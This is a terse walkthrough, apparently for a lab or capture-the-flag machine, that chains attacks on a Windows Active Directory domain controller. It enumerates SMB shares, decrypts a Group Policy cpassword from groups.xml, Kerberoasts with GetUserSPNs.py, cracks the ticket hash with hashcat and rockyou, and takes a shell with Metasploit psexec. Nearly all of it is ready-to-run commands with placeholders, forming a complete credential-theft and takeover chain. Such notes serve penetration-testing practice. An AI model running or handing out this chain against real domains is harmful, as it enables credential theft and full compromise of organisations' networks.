1) first get to ad share with smbclient
```
smbclient -L \\\\<dc ip>\\
```
2) from there we grap the groups.xml file, and copy the content of cpassword and then write
```
gpp-decrypt <cpp_password_content>
```

3) locate GetUserSPNs.py and run
```
python GetUserSPNs.py <username_for_groups.xml_file> -dc-ip <dc_ip>
```
when prompt for password paste the decrypted one we got  
4) now we crack the hash with hashcat  
(copy the output you got and put it to text file).  
```
hashcat -m 13100 <textfile_we_created> <wordlist - (usually rockyou.txt)>
```
5) then go to msfconsole  
```
msfconsole -q
use exploit/windows/smb/psexec
set smbdomain <domain_full_name>
set smbuser <user>
set smbpass <what_we_got_from_the_hashcat>
set rhost <dc_ip>
exploit
```
